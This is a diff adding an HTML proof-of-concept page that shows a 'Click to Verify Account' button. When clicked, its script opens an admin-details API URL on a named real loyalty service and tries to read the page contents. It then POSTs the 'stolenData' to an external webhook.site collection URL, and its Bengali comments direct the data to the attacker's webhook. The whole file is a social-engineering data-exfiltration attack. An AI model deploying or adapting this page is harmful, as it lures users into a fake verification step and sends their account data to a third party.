@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <button onclick="exploit()">Click to Verify Account</button>
+
+    <script>
+        function exploit() {
+            // ১. একটি নতুন উইন্ডোতে টার্গেট সাইটটি ওপেন করা
+            var win = window.open("https://loyalty.yotpo.com/api/v1/admin_details", "victim_win");
+
+            // ২. কয়েক সেকেন্ড অপেক্ষা করে ডাটা রিড করার চেষ্টা
+            setTimeout(function() {
+                try {
+                    var stolenData = win.document.body.innerHTML;
+                    // ৩. ডাটা আপনার Webhook-এ পাঠানো
+                    fetch("https://webhook.site/bb29ec8b-4687-4463-a63c-9468fd24d200", {
+                        method: "POST",
+                        body: stolenData
+                    });
+                } catch(e) {
+                    console.log("Blocked by SOP, but data might still leak via headers.");
+                }
+            }, 5000);
+        }
+    </script>
+</body>
+</html>
